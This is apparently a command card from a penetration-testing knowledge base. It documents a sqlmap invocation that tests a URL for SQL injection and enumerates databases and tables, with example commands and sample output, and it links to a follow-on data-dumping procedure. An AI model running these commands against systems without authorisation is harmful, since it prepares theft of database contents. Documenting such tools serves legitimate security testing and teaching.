---
id: new-uuid-enum-001
name: sqlmap-enumerate-databases-and-tables
type: command
executor: bash
data: sqlmap -u '$_TARGET_URL' --dbs --tables
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - sqlmap
  - sqli
  - enumeration
verified: true
validated: true
---

# sqlmap-enumerate-databases-and-tables

## Command

```bash
sqlmap -u '$_TARGET_URL' --dbs --tables
```

## Description

This command uses SQLMap to test a URL for SQL injection vulnerabilities and enumerate available databases (--dbs) and their tables (--tables). It is the preparatory step before targeted dumping, confirming the backend DBMS (e.g., MySQL) and listing structures like 'vulcart' database with 'admindetails' table.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u '$_TARGET_URL' | The full URL with vulnerable parameter (e.g., http://192.168.1.100/search.php?term=) | Yes |
| --dbs | Enumerate database names | Yes |
| --tables | List tables in the current or specified database | Yes |

## Examples

### Basic Usage

```bash
sqlmap -u 'http://example.com/search.php?term=' --dbs --tables
```

### Advanced Usage

```bash
sqlmap -u 'http://example.com/search.php?term=' --dbs --tables -D vulcart
```

## Expected Output

Description of what output to expect when the command runs successfully.

```
[*] starting at XX:XX:XX
[INFO] the back-end DBMS is MySQL
available databases [2]:
[*] information_schema
[*] vulcart

Database: vulcart
[3 tables]
+--------------+
| admindetails |
| products     |
| users        |
+--------------+
```

## Related

- [[procedures/Dump-Database-Contents-Using-SQLMap]]
- [[tools/sqlmap]]
